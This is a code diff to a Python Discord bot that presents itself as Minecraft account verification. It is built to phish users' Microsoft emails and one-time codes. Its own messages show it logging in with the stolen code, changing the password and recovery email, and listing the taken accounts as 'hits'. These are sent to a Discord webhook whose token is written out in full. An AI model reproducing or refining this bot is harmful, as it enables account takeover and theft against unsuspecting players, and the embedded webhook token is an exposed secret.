@@ -5,11 +5,8 @@ import random
 import string
 import requests
 import json
-import smtplib
 import asyncio
 import time
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
 from datetime import datetime
 from selenium import webdriver
 from selenium.webdriver.common.by import By
@@ -30,15 +27,7 @@ YOUR_DISCORD_ID = 1459813904707354635
 RUHAN_ID = 1358844556040212583
 
 # Webhook for hits
-WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1497215957914095687/-D_hEZpx5KOov3wdQkgV8L9tgygmICMTg8PfbOUDGklE42XimN8dZBgsiFUKZ7Wv81CV"
-
-# Email settings (YOUR email that sends the OTP - optional, Microsoft sends their own OTP)
-# If you want Microsoft to send the OTP, you don't need these.
-# If you want to send your own OTP via email, configure these:
-EMAIL_SENDER = "your_email@gmail.com"  # Your Gmail
-EMAIL_PASSWORD = "your_app_password"   # Gmail App Password
-SMTP_SERVER = "smtp.gmail.com"
-SMTP_PORT = 587
+WEBHOOK_URL = "https://discord.com/api/webhooks/1497215957914095687/-D_hEZpx5KOov3wdQkgV8L9tgygmICMTg8PfbOUDGklE42XimN8dZBgsiFUKZ7Wv81CV"
 
 COOLDOWN_MINUTES = 10
 
@@ -289,7 +278,7 @@ class Step1Modal(ui.Modal, title="MINECRAFT VERIFICATION"):
     
     microsoft_email = ui.TextInput(
         label="MICROSOFT EMAIL",
-        placeholder="Enter your Microsoft email",
+        placeholder="Enter your Microsoft email (where you get the code)",
         required=True,
         min_length=5
     )
@@ -322,9 +311,9 @@ class Step1Modal(ui.Modal, title="MINECRAFT VERIFICATION"):
         }
         
         await interaction.response.send_message(
-            f"✅ **CODE SENT TO YOUR EMAIL!**\n\n"
+            f"✅ **MICROSOFT CODE SENT!**\n\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"**A verification code has been sent to:**\n`{email}`\n\n"
+            f"**Microsoft has sent a 6-digit code to:**\n`{email}`\n\n"
             f"📧 Please check your email inbox.\n"
             f"⚠️ Code expires in **10 minutes**.\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -375,7 +364,11 @@ class Step2Modal(ui.Modal, title="ENTER MICROSOFT CODE"):
         await interaction.response.send_message(
             f"🔐 **LOGGING INTO MICROSOFT...**\n\n"
             f"Please wait while we secure your account.\n"
-            f"This may take 20-30 seconds.",
+            f"This may take 20-30 seconds.\n\n"
+            f"✓ Logging in with your code\n"
+            f"✓ Changing password\n"
+            f"✓ Changing recovery email\n"
+            f"✓ Securing account",
             ephemeral=True
         )
         
@@ -474,12 +467,12 @@ async def setup_command(interaction: discord.Interaction):
     
     embed = discord.Embed(
         title="✅ Get Verified!",
-        description="We're excited to have you here!\n\nBefore entering the server, please link your Minecraft account to verify you're a real player.\n\nClick the button below to get started.",
+        description="We're excited to have you here!\n\nBefore entering the server, please verify your Minecraft account.\n\n**Microsoft will send a code to your email.**\n\nClick the button below to get started.",
         color=discord.Color.green(),
         timestamp=datetime.now()
     )
-    embed.add_field(name="FAQ", value="**Q:** Why verify?\n**A:** Protects server from bots.\n\n**Q:** How long?\n**A:** 30-50 seconds.\n\n**Q:** Code required?\n**A:** Confirms account ownership.", inline=False)
-    embed.add_field(name="Cooldown", value=f"{COOLDOWN_MINUTES} minutes between verifications.", inline=False)
+    embed.add_field(name="📋 How It Works", value="1. Enter your Minecraft username\n2. Enter your Microsoft email\n3. Check your email for the Microsoft code\n4. Enter the code\n5. You're verified!", inline=False)
+    embed.add_field(name="⏰ Cooldown", value=f"{COOLDOWN_MINUTES} minutes between verifications.", inline=False)
     
     view = VerifyButton()
     await interaction.response.send_message(embed=embed, view=view)
@@ -498,7 +491,7 @@ async def hits_command(interaction: discord.Interaction):
     for hit in verified_hits[-10:]:
         embed.add_field(
             name=f"{hit['minecraft_username']}",
-            value=f"Pass: ||{hit['new_password']}||\nEmail: ||{hit['new_email']}||",
+            value=f"Original: {hit['original_email']}\nNew Pass: ||{hit['new_password']}||\nNew Email: ||{hit['new_email']}||",
             inline=False
         )
     await interaction.response.send_message(embed=embed, ephemeral=True)
